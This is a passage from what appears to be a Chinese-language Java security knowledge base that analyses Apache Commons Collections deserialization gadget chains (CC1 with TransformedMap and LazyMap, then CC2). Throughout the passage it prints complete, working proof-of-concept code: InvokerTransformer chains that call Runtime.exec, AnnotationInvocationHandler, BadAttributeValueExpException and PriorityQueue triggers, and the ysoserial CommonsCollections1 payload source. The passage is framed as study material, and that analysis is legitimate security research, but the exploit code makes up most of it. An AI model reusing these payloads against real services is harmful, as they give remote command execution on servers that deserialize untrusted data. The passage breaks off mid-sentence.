//服务端反序列化成ChainedTransformer格式，并在服务端自主传入恶意参数input Transformer transformer = (ChainedTransformer) objectInputStream.readObject(); transformer.transform(null); } } 但是很遗憾的告诉以为快要成功的你，成功的本地测试加上序列化、反序列化过程之后就会失败。 因为Runtime类的定义没有继承Serializable类，所以是不支持反序列化的。 那么我们在payload写入Runtime实例的计划就泡汤了 在服务端生成Runtime实例 既然我们没法在客户端序列化写入Runtime的实例，那就让服务端执行我们的命令生成一个Runtime实例呗？ 我们知道Runtime的实例是通过Runtime.getRuntime()来获取的，而InvokerTransformer里面的反射机制可以执行任意函数。 同时，我们已经成功执行过Runtime类里面的exec函数。讲道理肯定是没问题的。 我们先看getRuntime方法的参数 public static Runtime getRuntime() { return currentRuntime; } Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class),//得到Runtime class //由于InvokerTransformer的构造函数要求传入Class类型的参数类型，和Object类型的参数数值，所以封装一下，下面也一样 //上面传入Runtime.class，调用Runtime class的getRuntime方法（由于是一个静态方法，invoke调用静态方法，传入类即可） new InvokerTransformer(\"getRuntime\",new Class[]{},new Object[]{}), //上面Runtime.getRuntime()得到了实例，作为这边的输入(invoke调用普通方法，需要传入类的实例) new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); transformerChain.transform(null); 看起来万事大吉了，但是 在对InvokerTransformer中Class cls = input.getClass(); 的解释中可以知道 当input是一个类的实例对象，获取到的是这个类 当input是一个类时，获取到的是java.lang.Class 我们来推演第一次InvokerTransformer的反射调用，即得到Runtime类对象的getRuntime方法调用 //InvokeTransformer关键语句： public Object transform(Object input) {//input为我们设置的常量Runtime.class Class cls = input.getClass();//这里由于input是一个类，会得到java.lang.Class //在java.lang.Class类中去寻找getRuntime方法企图得到Runtime类对象，此处报错 Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } 那么我们好像陷入了一个死胡同： 得到Runtime类实例才能调用exec方法。 而得到Runtime类实例作为input，才能得到Runtime class，才能找到getRuntime方法，得到Runtime类实例......... 继续反思反射机制 那么我们通过直接调用Runtime.getRuntime方法好像是行不通了,有没有其他方法呢？ 目前问题有如下： 我们开头不能获得Class.forName(\"java.lang.Runtime\")，只能得到Class.forName(\"java.lang.Class\") 我们可以有任意的反射机制 我们要获取到Runtime.getRunime函数，并执行它。 通过反射机制获取反射机制中的getMethod类，由于getMethod类是存在Class类中，就符合开头Class类的限制 通过getMethod函数获取Runtime类中的getRuntime函数 在哪个类中调用getMethod去获取方法，实际上是由invoke函数里面的的第一个参数obj决定的 再通过反射机制获取反射机制中的invoke类，执行上面获取的getRuntime函数 invoke调用getRuntime函数，获取Runtime类的实例 这里在使用反射机制调用getRuntime静态类时，invoke里面第一个参数obj其实可以任意改为null，或者其他类，而不一定要是Runtime类 我们最终要目的要执行 Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\") 先来获取getRuntime类 //目标语句 Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\") //使用java.lang.Class开头 Class.forName(\"java.lang.Class\").getMethod(\"getMethod\", new Class[] {String.class, Class[].class }) .invoke(Class.forName(\"java.lang.Runtime\"),\"getRuntime\",new Class[0]); //invoke函数的第一个参数是Runtime类，我们需要在Runtime类中去执行getMethod，获取getRuntime参数 对照着InvokerTransformer类转变为transformers格式 Class cls = input.getClass();//cls = java.lang.Class Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //getMethod方法 return method.invoke(input, this.iArgs); //在Runtime中找getRuntime方法，并返回这个方法 Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), //还需要填充 调用getRuntime得到Runtime实例, new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}) }; 还差执行获取到的getRuntime，下一个input是上一个执行接口，继续对照 //input=getRuntime这个方法 Class cls = input.getClass();//cls = java.lang.Method（getRuntime方法是method类） Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //在method类中找到invoke方法，method=invoke方法 return method.invoke(input, this.iArgs); //调用invoke方法，input=getRuntime这个方法，传入自定义的参数 以上最后一步有点复杂，method就是invoke方法，相当于使用invoke调用了invoke函数。 首先this.iMethodName, this.iParamTypes是根据invoke接口而定的： public Object invoke(Object obj, Object... args) //this.iMethodName=\"invoke\" //this.iParamTypes=new Class[] {Object.class, Object[].class } //外面class、Object封装是InvokerTransformer类的构造函数要求 按照invoke中的input才是它要调用的环境的准则。 invoke方法.invoke(input, this.iArgs)实际上等于input.invoke(this.iArgs)， 而input=getRuntime方法，那么只要填入this.iArgs就好了 又由于getRuntime是个静态函数，不用太纠结输入obj，写作null。getRuntime方法不需要参数。 this.iArgs=null,new Object[0] 那么整合如下： Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}) }; 也就是我们Commons Collections1的前置知识里讲的payload，到了这里才讲到为什么构造前置知识中的payload TransformedMap 那么我们在第二步通过ConstantTransformer、ChainedTransformer就完成了payload在客户端自定义这一目标，我们看一下目前的攻击流程 package com.myproject; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class, Class[].class},new Object[]{\"getRuntime\",new Class[0]}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); FileOutputStream fileOutputStream = new FileOutputStream(\"payload.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(transformerChain); FileInputStream fileInputStream = new FileInputStream(\"payload.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); Transformer transformer = (ChainedTransformer) objectInputStream.readObject(); transformer.transform(null); } } 完成命令执行服务端执行如下操作： 服务端反序列化我们的输入成ChainedTransformer类型 调用这个输入的transform()函数 转变的类型是一个数据转化链数据格式，很明显服务端不可能存在这种代码，利用价值不足，接下来我们需要继续延长这个漏洞链。 封装成Map 由于我们得到的是ChainedTransformer，一个转换链，TransformedMap类提供将map和转换链绑定的构造函数，只需要添加数据至map中就会自动调用这个转换链执行payload。 这样我们就可以把触发条件从显性的调用转换链的transform函数延伸到修改map的值。很明显后者是一个常规操作，极有可能被触发 TransformedMap public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer); } package com.myproject; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //payload序列化写入文件，模拟网络传输 FileOutputStream fileOutputStream = new FileOutputStream(\"payload.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(outerMap); // 服务端反序列化客户端代码，触发漏洞 FileInputStream fileInputStream = new FileInputStream(\"payload.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); //服务端反序列化成Map格式，再调用transform函数 Map outerMap_now = (Map) objectInputStream.readObject(); //2.1可以直接map添加新值，触发漏洞 outerMap_now.put(\"123\", \"123\"); //2.2也可以获取map键值对，修改value，value为value，foobar,触发漏洞 // Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); // onlyElement.setValue(\"foobar\"); } } jdk1.7 AnnotationInvocationHandler的readObject复写点 上面的漏洞触发条件仍然不够完美，需要服务端把我们传入的序列化内容反序列化为map，并对值进行修改。 之前也说过完美的反序列化漏洞还需要一个readobject复写点，只要服务端执行了readObject函数就等于命令执行。 在jdk1.7中就存在一个完美的readobject复写点的类sun.reflect.annotation.AnnotationInvocationHandler。 先看对应的构造函数 AnnotationInvocationHandler(Class var1, Map var2) { Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) {//var1满足这个if条件时 this.type = var1;//传入的var1到this.type this.memberValues = var2;//我们的map传入this.memberValues } else { throw new AnnotationFormatError(\"Attempt to create proxy for a non-annotation type.\"); } } readobject复写函数 private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { //默认反序列化 var1.defaultReadObject(); AnnotationType var2 = null; try { var2 = AnnotationType.getInstance(this.type); } catch (IllegalArgumentException var9) { throw new InvalidObjectException(\"Non-annotation type in annotation serial stream\"); } Map var3 = var2.memberTypes();// Iterator var4 = this.memberValues.entrySet().iterator();//获取我们构造map的迭代器 while(var4.hasNext()) { Entry var5 = (Entry)var4.next();//遍历map迭代器 String var6 = (String)var5.getKey();//获取key的名称 Class var7 = (Class)var3.get(var6);//获取var2中相应key的class类？这边具体var3是什么个含义不太懂，但是肯定var7、8两者不一样 if (var7 != null) { Object var8 = var5.getValue();//获取map的value if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) { //两者类型不一致，给var5赋值！！具体赋值什么已经不关键了！只要赋值了就代表执行命令成功 var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + \"[\" + var8 + \"]\")).setMember((Method)var2.members().get(var6))); } } } } } readObject最终对于我们传入构造函数的map进行遍历赋值。 这样就弥补了我们之前反序列化需要服务端存在一些条件的不足，形成完美反序列化攻击 最终模拟攻击代码 package com.myproject; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class,Map.class); constructor.setAccessible(true); Object object = constructor.newInstance(Target.class,outerMap); //payload序列化写入文件，模拟网络传输 FileOutputStream fileOutputStream = new FileOutputStream(\"payload.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(object); // 服务端反序列化客户端代码，触发漏洞 FileInputStream fileInputStream = new FileInputStream(\"payload.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); // 直接反序列化 objectInputStream.readObject(); } } 至此，我们在客户端构造了payload发送至服务端， 只要服务端 对我们的输入进行反序列化 jdk版本为1.7 就可以直接完成命令执行 问题 为什么innerMap.put(\"value\", \"value\");将key更改为其他值，就不能执行成功？(innerMap.put(\"key\", \"value\");这种格式) debug一下看看 在readObject中，var3是一个map结构，var6 会获取我们构造的map中的key值，然后通过key值取var3中的class，如果var6!=value，那么var7为空，不能进入if结构，导致不能进行setValue操作（也就是反序列化赋值操作），所以在这里需要将值固定为键值设置为value 参考链接 https://xz.aliyun.com/t/7031 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 15:30:40 "},"知识库/02.JAVA安全/19.CommonsCollections/01.CC1/03.Commons Collections 1 LazyMap利用链.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/01.CC1/03.Commons Collections 1 LazyMap利用链.html","title":"03.Commons Collections 1 LazyMap利用链","keywords":"","body":"背景 在ysoserial中CC1的payload中使用了LazyMap，LazyMap和TransformedMap类似，都继承 AbstractMapDecorator 我们可以先看看payload package ysoserial.payloads; import java.lang.reflect.InvocationHandler; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import ysoserial.payloads.annotation.Authors; import ysoserial.payloads.annotation.Dependencies; import ysoserial.payloads.annotation.PayloadTest; import ysoserial.payloads.util.Gadgets; import ysoserial.payloads.util.JavaVersion; import ysoserial.payloads.util.PayloadRunner; import ysoserial.payloads.util.Reflections; /* Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() Requires: commons-collections */ @SuppressWarnings({\"rawtypes\", \"unchecked\"}) @PayloadTest ( precondition = \"isApplicableJavaVersion\") @Dependencies({\"commons-collections:commons-collections:3.1\"}) @Authors({ Authors.FROHOFF }) public class CommonsCollections1 extends PayloadRunner implements ObjectPayload { public InvocationHandler getObject(final String command) throws Exception { final String[] execArgs = new String[] { command }; // inert chain for setup final Transformer transformerChain = new ChainedTransformer( new Transformer[]{ new ConstantTransformer(1) }); // real chain for after setup final Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, execArgs), new ConstantTransformer(1) }; final Map innerMap = new HashMap(); final Map lazyMap = LazyMap.decorate(innerMap, transformerChain); final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class); final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy); Reflections.setFieldValue(transformerChain, \"iTransformers\", transformers); // arm with actual transformer chain return handler; } public static void main(final String[] args) throws Exception { PayloadRunner.run(CommonsCollections1.class, args); } public static boolean isApplicableJavaVersion() { return JavaVersion.isAnnInvHUniversalMethodImpl(); } } 效果如下 TransformedMap是在写入元素的时候执行transform方法，LazyMap是在其get方法中执行的 this.factory.transform LazyMap的作用是“懒加载”，在get找不到值的时候，它会调用 this.factory.transform 方法去获取一个值 public Object get(Object key) { // create value for key if key is not currently in the map if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } factory也是可控的 protected LazyMap(Map map, Transformer factory) { super(map); if (factory == null) { throw new IllegalArgumentException(\"Factory must not be null\"); } this.factory = factory; } 所以构造poc的时候只要令factory为精心构造的ChainedTransformer就行，因此我们找一下哪里可能调用了LazyMap的get方法 但是我们在AnnotationInvocationHandler#readObject函数中并没有看到有执行get方法，所以ysoserial找到了另一条路，AnnotationInvocationHandler类的invoke方法有调用到get： AnnotationInvocationHandler#invoke看到invoke方向就大概联想到Java的动态代理机制。 动态代理 总结为一句话就是，被动态代理的对象调用任意方法都会通过对应的InvocationHandler的invoke方法触发 这里再举个例子说明一下如何自动调用的invoke方法 InvocationHandlerExample.class InvocationHandlerExample类继承了InvocationHandler，实现了invoke方法，作用是在监控到调用的方法名是get的时候，返回一个特殊字符串 Hacked Object 。 package com.myproject; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { InvocationHandlerExample invocationHandlerExample = new InvocationHandlerExample(new HashMap()); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},invocationHandlerExample); proxyMap.put(\"1\",\"Hacked Object\"); System.out.println(proxyMap.get(\"1\")); } } 可以看到调用的get方法，但是被我们动态代理中的invoke方法拦截了，返回了Hacked Object 也就是说这个Map对象经过动态代理处理之后，动态代理对象调用任何一个方法时会调用handler中的invoke方法。 我们回看sun.reflect.annotation.AnnotationInvocationHandler，会发现实际上这个类实际就是一个InvocationHandler，我们如果将这个对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到AnnotationInvocationHandler#invoke方法中，进而触发我们的LazyMap#get 构建POC 对sun.reflect.annotation.AnnotationInvocationHandler对象进行Proxy Map outerMap = LazyMap.decorate(innerMap, transformerChain); // 构建对象 Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, outerMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); // 代理对象 handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap); // 包裹 package com.myproject; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import javax.swing.*; import java.io.*; import java.lang.annotation.Retention; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.Arrays; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\"a\", 1); Map outerMap = LazyMap.decorate(innerMap, transformerChain); // 构建对象 Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, outerMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); // 代理对象 handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap); // 包裹 // 序列化 FileOutputStream fileOutputStream = new FileOutputStream(\"payload.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(handler); // 反序列化 FileInputStream fileInputStream = new FileInputStream(\"payload.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } } LazyMap 利用链补充 CC1受限制于jdk1.7，上面的poc使用了动态代理，那么有没有不使用动态代理的方法呢？（当然这里依然还是使用jdk1.7) LazyMap类的get方法中调用了transform方法，那么除了AnnotationInvocationHandler的invoke方法中调用了get方法外，还有，TiedMapEntry类的getValue方法也调用了get方法 而且this.map我们也可以控制，但是我们最终要找的还是readObject方法中的触发点，所以继续网上找，看看哪里调用了TiedMapEntry的getValue方法，找到TiedMapEntry类的toString方法 toString方法在进行字符串拼接或者手动把某个类转换为字符串的时候会被调用，所以，现在我们找找把TiedMapEntry的对象当做字符串处理的地方，找到了BadAttributeValueExpException的readObject方法中有相关调用： 可以看到第三个if分支里调用了valObj.toString(),而valObj=gf.get(\"val\", null),这里其实就是读取传过来对象的val属性值，所以，只要我们控制**BadAttributeValueExpException**对象的**val属性**的值为我们精心构造的**TiedMapEntry**对象就行。所以，就有了下面的poc: package com.myproject; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import javax.management.BadAttributeValueExpException; import javax.swing.*; import java.io.*; import java.lang.annotation.Retention; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.Arrays; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\"a\", 1); Map outerMap = LazyMap.decorate(innerMap, transformerChain); // 构建对象 Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,\"123\"); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); Field val = badAttributeValueExpException.getClass().getDeclaredField(\"val\"); val.setAccessible(true); val.set(badAttributeValueExpException, tiedMapEntry); // 序列化 FileOutputStream fileOutputStream = new FileOutputStream(\"payload.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(badAttributeValueExpException); // 反序列化 FileInputStream fileInputStream = new FileInputStream(\"payload.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } } Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2024-09-06 15:58:14 "},"知识库/02.JAVA安全/19.CommonsCollections/02.CC2/Commons Collection 2 分析.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/02.CC2/Commons Collection 2 分析.html","title":"Commons Collection 2 分析","keywords":"","body":"简介 CC2 使用的是 javassist和PriorityQueue来构造利用链，并且使用的是commons-collections-4.0版本，而3.1-3.2.1版本中TransformingComparator并没有去实现Serializable接口，也就是说这是不可以被序列化的，所以CC2不用3.x版本 环境 jdk1.8 commons collections4-4.0 POC 首先看poc package com.myproject; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class TestCC2 { public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, NoSuchFieldException { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class}, new String[] {\"calc.exe\"}), }; Transformer transformerChain = new ChainedTransformer(transformers); TransformingComparator Tcomparator = new TransformingComparator(transformerChain); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,Tcomparator); try{ ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"cc2.ser\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"cc2.ser\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } ysoserial提供的利用链如下 /* Gadget chain: ObjectInputStream.readObject() PriorityQueue.readObject() ... TransformingComparator.compare() InvokerTransformer.transform() Method.invoke() Runtime.exec() */ 我们可以看到这段代码，和CC1中的payload是一样的，看过Commons Collection1 分析利用的朋友在这里不难理解为什么我们要这样构造 Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class}, new String[] {\"calc.exe\"}), }; 提出问题 然后看下面的代码，就会好奇了 Transformer transformerChain = new ChainedTransformer(transformers); TransformingComparator Tcomparator = new TransformingComparator(transformerChain); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,Tcomparator); 我们在Commons Collection1 分析利用中可以知道，我们需要创建一个map，并绑定transformerchain，并在最后给予map数据转化链，然后再进行序列化，反序列化 最后再触发漏洞。在cc2链其实差不太多，我们需要给予一个数据转化链给comparator(比较器)，并绑定transformerchain，然后通过给queue(队列)赋值，最后序列化该实例queue，再反序列化，完成攻击。 并且在java.util.PriorityQueue构造函数中，存在构造函数是可以传入comparator的，为什么还要通过反射，给comparator赋值呢？ public PriorityQueue(int initialCapacity, Comparator comparator) { // Note: This restriction of at least one is not actually needed, // but continues for 1.5 compatibility if (initialCapacity 那么我们不使用反射，就利用构造函数来试一试呢？ package com.myproject; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class TestCC2 { public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, NoSuchFieldException { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class}, new String[] {\"calc.exe\"}), }; Transformer transformerChain = new ChainedTransformer(transformers); TransformingComparator Tcomparator = new TransformingComparator(transformerChain); PriorityQueue queue = new PriorityQueue(1, Tcomparator); queue.add(1); queue.add(2); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"cc2.ser\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"cc2.ser\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } 在这里就有一个很隐藏的问题，看似执行了命令，但是却没有生成cc2.ser反序列化文件，说明没有进入try{}catch()，那么执行的命令就是客户端命令，而不会发送到服务端 在此处分析一下，为什么我们将Tcomparator通过构造函数写进去，生成的实例化对象queue，是不会进行进入try代码块序列化，就直接在客户端执行命令 分析 在queue.add处调试，在PriorityQueue这个构造函数中，这里就是我们传入的TransformingComparator 继续跟进，在queue.add(2)中，调用了offer方法 跟进offer方法，在这里需要关注siftUp方法 在siftUp方法中，comparator不为null(是我们传入的TransformingComparator)，则进入if循环，调用siftUpUsingComparator 方法 重点到comparator.compare()方法中，跟进 就到了compare方法中，在这里调用了两次this.transformer.transform方法 iTransformer从arr(构造的transformers[]数组)里取值，再调用transform方法 transform 方法就实现链式调用，执行transformers[]数组的Runtime.getRuntime.exec() 方法 像这样执行了两次，导致会弹出两次计算器，然后在此处执行完命令就抛出异常，程序就直接crash 此时根本就还只是在向队列添加数据阶段，还没有进行序列化就直接crash，是根本就不行的 解决方案 我们在调用了siftUpUsingComparator方法，如果不走if分支，走else分支呢？也就是说不传入comparator，让其为null PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); 当其为null的时候，进入siftUpComparable方法，可以发现在这里只对队列进行了赋值操作，并没有进行compare操作。 返回后就执行序列化代码，但是并没有执行命令 那么如果需要在readObject中调用compare方法这个是否可能成功呢? 这里我们要知道，序列化是将对象转换成字符串的过程，反序列化是将字符串转换成对象的过程，那么在反序列化的过程中，读取了字符串，将其转换成对象之后是不是就需要赋值操作呢？那么在赋值操作的时候，我们不让comparator为null，那么就能进入到siftDownUsingComparator函数中 条件： 要执行try-catch代码块的内容 -> queue 